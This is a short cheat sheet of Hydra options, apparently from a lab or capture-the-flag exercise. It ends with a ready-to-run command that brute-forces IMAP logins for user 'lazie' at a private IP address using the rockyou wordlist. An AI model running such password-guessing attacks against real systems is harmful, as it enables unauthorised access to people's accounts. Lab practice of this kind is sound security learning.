# -l username 	# Provide the login name
# -P WordList.txt	# Specify the password list to use
# server service	# Set the server address and service to attack
# -s PORT   # 	Use in case of non-default service port number
# -V or -vV	  # Show the username and password combinations being tried
# -d	  #  Display debugging output if the verbose output is not helping


## IMAP 

     hydra -l lazie -P /usr/share/wordlists/rockyou.txt -f 10.10.236.254 imap -v
